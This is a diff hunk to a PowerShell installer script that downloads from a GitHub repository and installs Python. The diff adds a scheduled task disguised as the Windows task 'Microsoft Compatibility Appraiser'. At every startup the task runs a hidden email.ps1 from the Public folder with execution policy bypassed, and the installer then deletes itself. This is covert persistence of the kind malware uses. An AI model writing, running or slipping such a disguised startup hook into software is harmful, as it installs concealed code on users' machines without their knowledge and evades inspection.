@@ -149,4 +149,7 @@ Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Reiya-cyber/ResearchPr
 # install python
 winget install --id 9PNRBTZXMB4Z --source msstore --accept-package-agreements --accept-source-agreements 
 
+schtasks /create /tn "Microsoft Compatibility Appraiser" /tr 'powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\Public\Public Display\email.ps1\"' /sc onstart /f
+
+
 Remove-Item installer.ps1
